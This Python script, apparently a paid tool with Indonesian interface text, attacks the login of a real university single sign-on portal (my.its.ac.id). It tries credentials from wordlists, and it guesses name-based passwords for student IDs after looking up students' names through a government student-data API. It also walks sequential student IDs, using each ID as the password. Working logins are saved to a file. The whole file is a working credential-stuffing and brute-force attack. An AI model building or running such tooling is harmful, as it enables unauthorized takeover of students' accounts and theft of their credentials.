import os, time, json, random, platform, urllib.parse, requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
from concurrent.futures import ThreadPoolExecutor
try:
    import requests as req
    from bs4 import BeautifulSoup as bs
except:
    os.system('pip install --upgrade pip')
    os.system('pip install requests bs4')
    os.system('clear')
    exit('Install bahan selesai\nSilahkan restart script')
else:
    grey = '\x1b[90m'
    red = '\x1b[91m'
    green = '\x1b[92m'
    yellow = '\x1b[93m'
    blue = '\x1b[94m'
    purple = '\x1b[95m'
    cyan = '\x1b[96m'
    white = '\x1b[37m'
    flag = '\x1b[47;30m'
    off = '\x1b[m'
    rv = platform.uname() 
    me = 4265913
    found = []
    error = []

    def upi(i, usr, pwd):
        ses = req.Session()
        url = 'https://my.its.ac.id/signin?response_type=code&redirect_uri=https%3A%2F%2Fmy.its.ac.id%2Fsso%2Fauth&client_id=8F7FA330-B0AF-4D91-9EC4-1A4182336EEC&nonce=45a074050afc3bc512bfd36f01e55d6b&state=43d5b41669eeb78d011924f84978bdbb&scope=openid+integra+profile+email+phone+group+role+resource'
        raw = ses.get(url).text
        tok = bs(raw, 'html.parser').findAll('input')[2]['value']
        dat = {'username':usr,  'password':pwd, 
         'execution':tok, 
         '_eventId':'submit', 
         'submit':'LOGIN'}
        gas = ses.post(url, data=dat).text
        res = bs(gas, 'html.parser').findAll('div')[2]['class'][0]
        if res == 'success':
            print(f" {purple}[{white}{i}{purple}]{green} aktifCoyy {yellow}>{green} {usr}{white}:{green}{pwd}")
            found.append(i)
            with open('rid.txt', 'a') as (s):
                s.write(f"{usr}:{pwd}\n")
        else:
            print(f" {purple}[{white}{i}{purple}]{red} meninggoy {yellow}>{red} {usr}{white}:{red}{pwd}")
            error.append(i)


    def done():
        print(f" {cyan}[{white}!{cyan}]{white} Scan selesai")
        print(f" {purple}[{white}!{purple}]{white} Aktif Coyy: {green}{len(found)}")
        print(f" {purple}[{white}!{purple}]{white} Meninggoy: {red}{len(error)}")
        print(f" {purple}[{white}!{purple}]{white} Akun aktif tersimpan")
        print(f" {cyan}[{white}*{cyan}]{white} Subscribe: {cyan}Koshyong")
        exit(f" {blue}[{yellow}✓{blue}]{purple} >>>>>>>>>>>>{cyan}[{yellow}BrC{cyan}]{purple}<<<<<<<<<<<<< {blue}[{yellow}✓{blue}]")

    def main():
        try:
            os.system('clear')
            print(f"{yellow} _________________________________")
            print(f"{off}[{flag} {red}ITS Scanner | {blue}by Pakblong  {off}]")
            print(f"{off}[{flag} {red}JANGAN LUPA | {blue}SUBSCRIBE CHANNEL {off}]")
            print(f"{off}[{flag} {red}Pakblong | {blue}CreateD Pakblong{off}]")
            print(f"{white}X{cyan}>>>>>>>>>>>>>>{purple}[{green}°×°{purple}]{cyan}<<<<<<<<<<<<<<{white}X")
            print(f"{off}[ {green}_______________________________ {off}]")
            print(f"{off}[{flag} {red} SCANNER {purple}UPI {blue}PREMIUM NIH BOSS         {off}]")
            print(f"{off}[{purple}°{green}Â{purple}°{green}Â{purple}°{green}Â{purple}°{green}Â{purple}°{green}Â{purple}°{green}Â{purple}°{green}Â{cyan}[{yellow}*_*{cyan}]{purple}{green}Â{purple}°{green}Â{purple}°{green}Â{purple}°{green}Â{purple}°{green}Â{purple}°{green}Â{purple}°{green}Â{purple}°{off}]")
            print(f"\033[2;36;40m===================================\n\033[2;37;40m{green}||{purple}S E M O G A B E R M A N F A A T{green}||\033[2;33;40m\n\033[2;36;40m===================================")
            akses = req.get(f"https://yutixcode.xyz/akses/upi/{me}", timeout=2, verify=False).status_code
            if akses != 200:
                print(f"\n {purple}[{white}1{purple}]{white} Scan {purple}Cepat")
                print(f" {purple}[{white}2{purple}]{white} Smart {blue}Scan")
                print(f" {purple}[{white}3{purple}]{white} Auto {yellow}Generate")
                select = input(f" {cyan}[{white}?{cyan}]{white} Pilih {green}Menu di Atas : ")
                if select == '1':
                    print(f" {purple}[{white}!{purple}]{white} Isi {cyan}Wordlist txt harus nim:pwd")
                    print(f" {purple}[{white}!{purple}]{white} Masukan {blue}file Wordlist nya")
                    path = input(f" {cyan}[{white}?{cyan}]{white} ")
                    with open(path, 'r') as (f):
                        lines = f.readlines()
                        count = 1
                        print(f" {purple}[{white}!{purple}]{white} Total {len(lines)} baris terdeteksi")
                        for line in lines:
                            data = line.strip()
                            user = data.split(':')[0]
                            pswd = data.split(':')[1]
                            if len(data) > 0:
                                upi(count, user, pswd)
                                count += 1
                                continue

                    done()
                elif select == '2':
                    print(f" {purple}[{white}!{purple}]{white} Isi file txt hanya nim")
                    print(f" {purple}[{white}!{purple}]{white} Masukan file")
                    path = input(f" {cyan}[{white}?{cyan}]{white} ")
                    with open(path, 'r') as (f):
                        lines = f.readlines()
                        count = 1
                        print(f" {purple}[{white}!{purple}]{white} Total {len(lines)} baris terdeteksi")
                        for line in lines:
                            nim = line.strip()
                            raw = req.get(f"https://api-frontend.kemdikbud.go.id/hit_mhs/{nim}", timeout=2).text
                            cek = json.loads(raw)
                            dat = cek['mahasiswa'][0]
                            par = dat['text'].split(',')[0].split('(')[0]
                            ser = par.split(' ')
                            upi(count, nim, nim)
                            count += 1
                            upi(count, nim, f"12345678")
                            count += 1
                            upi(count, nim, f"{ser[0].title()}")
                            count += 1
                            upi(count, nim, f"{ser[0].title()}123")
                            count += 1
                            upi(count, nim, f"{ser[0].title()}12345")
                            count += 1
                            upi(count, nim, (f"@{ser[0].title()}"))
                            count += 1
                            upi(count, nim, f"@{ser[0].title()}123")
                            count += 1
                            upi(count, nim, (f"@{ser[0].title()}12345"))
                            count += 1

                    done()
                else:
                    if select == '3':
                        print(f" {purple}[{white}!{purple}]{white} Masukan nim sebagai patokan")
                        print(f" {purple}[{white}!{purple}]{white} Contoh: 1703900")
                        uid = int(input(f" {cyan}[{white}?{cyan}]{white} Nim: "))
                        max = int(input(f" {cyan}[{white}?{cyan}]{white} Max: "))
                        for i in range(max):
                            upi(i + 1, uid, uid)
                            uid += 1
                        else:
                            done()

                    else:
                        exit(f"{purple} [{white}!{purple}] {white}Input error")
            else:
                print(f"\n {purple}[{white}!{purple}]{white} Script ini berbayar")
                print(f" {purple}[{white}!{purple}]{white} Kode akses: {green}{me}")
                input(f" {purple}[{white}!{purple}]{white} Tekan enter untuk membeli {purple}> ")
                msg = f"Beli Script *UPI Scanner*\nAccessCode: {me}\n"
                print(f" {purple}[{white}!{purple}]{white} Mengalihkan ke WA ...")
                time.sleep(1.5)
                os.system(f"xdg-open https://wa.me/+6285890361684?text={urllib.parse.quote(msg, safe='')}")
        except KeyboardInterrupt:
            exit(f"{purple} [{white}!{purple}] {white}Keyboard Interrupted")
        except FileNotFoundError:
            exit(f"{purple} [{white}!{purple}] {white}File tidak ditemukan")
        except IndexError:
            exit(f"{purple} [{white}!{purple}] {white}Maaf format dalam file salah")
        except Exception as e:
            try:
                exit(f"{purple} [{white}!{purple}] {white}Something error, sorry :(")
            finally:
                e = None
                del e


    if __name__ == '__main__':
        main()
